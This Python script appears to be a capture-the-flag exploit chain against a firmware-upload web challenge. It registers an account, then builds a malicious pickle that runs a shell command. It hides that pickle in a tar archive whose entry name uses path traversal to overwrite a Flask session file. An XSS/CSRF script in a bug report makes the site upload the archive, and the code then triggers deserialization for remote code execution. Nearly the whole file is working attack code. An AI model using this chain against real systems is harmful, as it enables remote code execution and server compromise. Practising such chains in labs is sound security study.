#!/usr/bin/env python3
import sys
import requests
import base64
import time
import tarfile
import io
import os
import pickle
import hashlib
import struct

hostURL = 'http://157.245.46.136:31078'               # Challenge URL
user = f'test'                            # new username
pwd = f'test'                             # new password

def register():
    data1 = { 'username': user, 'password': pwd }
    req = requests.post(f'{hostURL}/api/register', json=data1)

def login():
    data2 = { 'username': user, 'password': pwd }
    cookie = requests.post(f'{hostURL}/api/login', json=data2).cookies.get('session')
    return cookie

def slip(file):
    class Exec:
        def __reduce__(self):
            cmd = ('/readflag > /app/application/static/flag.txt')
            return os.system, (cmd,)
    pickle_time = struct.pack("I", 0000)
    pickled_payload = pickle_time + pickle.dumps(Exec())

    zipslip = io.BytesIO()
    tar = tarfile.open(fileobj=zipslip, mode='w:gz')
    info = tarfile.TarInfo(f'../../../../../app/flask_session/{file}')
    info.mtime = time.time()
    info.size = len(pickled_payload)
    tar.addfile(info, io.BytesIO(pickled_payload))
    tar.close()

    return base64.b64encode(zipslip.getvalue()).decode()


print('[+] Registering into an account')
register()

print('[~] Acquiring cookies')
cookie = login()

print('[+] Preparing zipslip payload file with matching cookie sid..')
sid = 'test'
file = hashlib.md5(sid.encode()).hexdigest()
b64_file = slip(file)

print('[+] XSS payload to upload the zipslip using CSRF')
xss_payload = """
<script>
const b64Data="%s"
const byteCharacters = atob(b64Data);
const byteArrays = [];
const sliceSize=512;
const contentType='multipart/form-data';
for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
const slice = byteCharacters.slice(offset, offset + sliceSize);

const byteNumbers = new Array(slice.length);
for (let i = 0; i < slice.length; i++) {
byteNumbers[i] = slice.charCodeAt(i);
}

const byteArray = new Uint8Array(byteNumbers);
byteArrays.push(byteArray);
}

const blob = new Blob(byteArrays, {type: contentType});

var formData = new FormData();
formData.append('file', blob, 'rh0x01.tar.gz');

var xhr = new XMLHttpRequest();
xhr.open('POST','/api/firmware/upload', true);
xhr.send(formData);
</script>
""" % b64_file

print('[+] Sending bug report with XSS payload..')
requests.post(
    f'{hostURL}/api/firmware/report',
    cookies={"session": cookie},
    json={'module_id': 1, 'issue': xss_payload}
)

print('[+] Executing Pickle RCE..')
requests.get(f'{hostURL}/dashboard',cookies={"session": sid})

flag = ''
while not flag:
    flag_resp = requests.get(f'{hostURL}/static/flag.txt')
    if flag_resp.status_code == 200:
        flag = flag_resp.text
    time.sleep(5)

print(f'[+] Flag: {flag}')
